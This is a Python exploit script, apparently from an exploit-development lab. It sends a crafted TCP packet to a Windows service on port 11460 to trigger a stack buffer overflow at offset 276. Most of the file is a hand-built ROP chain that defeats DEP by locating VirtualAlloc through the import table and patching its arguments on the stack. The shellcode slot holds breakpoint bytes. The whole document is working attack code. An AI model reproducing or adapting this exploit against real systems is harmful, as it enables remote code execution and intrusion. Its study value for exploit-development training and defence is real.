#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

# Results
# eip=41326a41
# pattern = 41 6a 32 41 = Aj2A
# $ msf-pattern_offset -q Aj2A -l 0x200
# [*] Exact match at offset 276

# eip offset: 276
# esp offset: 280

eip_offset = 276
command_buffer_length = 0x400

# psAgentCommand
buf = bytearray([0x41] * 0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)  # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41] * 0x8)

# psCommandBuffer
# These are dummy values for eventually calling VirtualAlloc.
va = pack("<L", 0x45454545)  # dummy VirutalAlloc Address
va += pack("<L", 0x46464646)  # Shellcode Return Address
va += pack("<L", 0x47474747)  # dummy Shellcode Address
va += pack("<L", 0x48484848)  # dummy dwSize (Eventually 0x00000001)
va += pack("<L", 0x49494949)  # dummy flAllocationType (Eventually 0x00001000)
va += pack("<L", 0x51515151)  # dummy flProtect (Eventually 0x00000040)

offset = b"\x90" * (276 - len(va))
# =======================================================================
# PART 1: Grab ESP.
# =======================================================================

# Move esp into eax.
eip = pack("<i", 0x50501110) # 0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret  ; -> mov esi, esp AKA Move the contents of esp into esi.
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn -> eax = esp
rop += pack("<L", (0x42424242)) # junk

# =======================================================================
# PART 2: Write the VirtualAlloc address.
# =======================================================================

# Subtract 0x1C from eax to get to VirtualAlloc address dummy placement.
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Copy the location of VirtualAlloc dummy in eax back to esi
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret

# Pop the address of VirtualAlloc from the DLL's import table into eax, fixing bad characters.
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Grab the address to VirtualAlloc in Kernel32.dll.
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret

# Write the kernel32.dll address of VirtualAlloc to the dummy virtualalloc address on the stack.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# =======================================================================
# Part 3: Patching the return address
# =======================================================================

# Reg esi points to VirtualAlloc. Add 4 to have it point to the shellcode return placeholder address.
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = esi. esi = junk.
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk

# esi = eax
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret

# Add 0x210 to eax.
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf0)) # -0x210
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret

# Write the value to the shellcode return address holder.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# =======================================================================
# Part 4: Push virtualalloc arguments.
# =======================================================================

# esi = esi + 4 (To Shellcode address)
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = esi. esi = junk
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk

# esi = eax (eax and esi = shellcode address)
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret

# eax = eax + 0x20c AKA 0x210 - 4
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf4)) # -0x20c
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret

# Write to shellcode address.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# Move to dwSize. esi += 4
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = -1
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0xffffffff)) # -1 value that is negated

# eax = eax * -1
rop += pack("<L", (0x50527840)) # neg eax ; ret

# Write 0x00000001 to dwSize.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# esi += 4 - Esi now points to flAllocationType.
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = 0x80808080
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x80808080)) # first value to be added

# ecx = 0x7f7f8f80
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f8f80)) # second value to be added

# eax = eax + ecx = 0x00001000
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Write 0x00001000 to flAllocationType.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# esi = esi + 4 - Esi now points to flProtect
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = 0x80808080
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x80808080)) # first value to be added

# ecx = 0x7f7f7fc0
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f7fc0)) # second value to be added

# eax = eax + ecx = 0x00000040.
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# mov [esi], eax - Set flProtect to 0x00000040.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# =======================================================================
# Part 5: Call VirtualAlloc.
# =======================================================================

# Let's setup the stack by setting esp to the value of VirutalAlloc location.
# esp will be VirutalAlloc's address on the stack.

# eax = esi - eax points to flProtect stack value.
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk

# ecx = 0xffffffe8 or -24
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe8)) # negative offset value

# eax = eax - 24 = flProtect - 24
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# ebp = eax
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret

# esp = ebp; ebp = junk.
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
# With esp at four bytes prior to VirutalAlloc's address, the ret command will place us in VirtualAlloc.

padding = b"\x90" * 0xe0
shellcode = b"\xcc" * (0x400 - 276 - 4 - len(rop) - len(padding))

payload = offset + va + eip + rop + padding + shellcode
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (payload, 0, 0, 0, 0)
buf += formatString

# Checksum
buf = pack(">i", len(buf) - 4) + buf


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()